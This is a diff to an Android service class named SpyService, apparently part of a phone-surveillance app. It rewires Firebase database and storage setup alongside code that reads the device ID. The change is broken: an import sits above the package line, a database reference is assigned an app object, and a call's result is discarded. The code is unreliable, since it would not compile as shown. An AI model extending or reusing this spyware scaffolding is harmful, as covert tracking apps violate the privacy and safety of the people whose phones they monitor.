@@ -1,3 +1,4 @@
+import com.google.firebase.FirebaseApp;
 package com.black.phone;
 
 import android.app.Service;
@@ -116,8 +117,10 @@ public class SpyService extends Service {
         context = this;
         client = new OkHttpClient();
         
+        FirebaseApp.initializeApp(this);
         FirebaseDatabase.getInstance().setPersistenceEnabled(true);
-        dbRef = FirebaseDatabase.getInstance().getReference();
+        dbRef = FirebaseApp.initializeApp(this);
+        FirebaseDatabase.getInstance().getReference();
         storageRef = FirebaseStorage.getInstance().getReference();
         
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
